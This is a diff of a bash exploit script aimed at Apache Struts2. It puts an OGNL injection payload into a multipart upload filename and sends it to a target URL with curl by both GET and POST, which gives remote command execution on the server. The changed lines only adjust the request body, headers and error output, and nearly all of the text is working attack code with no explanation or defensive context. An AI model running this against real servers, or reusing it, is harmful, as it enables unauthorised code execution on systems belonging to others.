@@ -10,9 +10,9 @@ payload=$(echo "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMB
 
 if [[ $1 ]]; then
 	echo "================HTTP GET Method================";
-	printf -- "--$boundary\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--$boundary--\r\n\r\n" "$payload" | curl "$url" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -H "Content-Type: $content_type" -H "Expect: " -H "Connection: close" --data-binary @- $@ 
+	printf -- "--$boundary\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nzzzzz\r\n--$boundary--\r\n\r\n" "$payload" | curl "$url" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -H "Content-Type: $content_type"  -H "Connection: close" --data-binary @- $@ 2>/dev/null
 	echo "================HTTP POST Method================"
-	printf -- "--$boundary\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--$boundary--\r\n\r\n" "$payload" | curl  -X 'POST' "$url" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -H "Content-Type: $content_type" -H "Connection: close" --data-binary @- $@ 2>/dev/null
+	printf -- "--$boundary\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nzzzzz\r\n--$boundary--\r\n\r\n" "$payload" | curl  -X 'POST' "$url" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -H "Content-Type: $content_type" -H "Connection: close" --data-binary @- $@ 2>/dev/null
 else :
 	echo "$0 [url]"
 fi
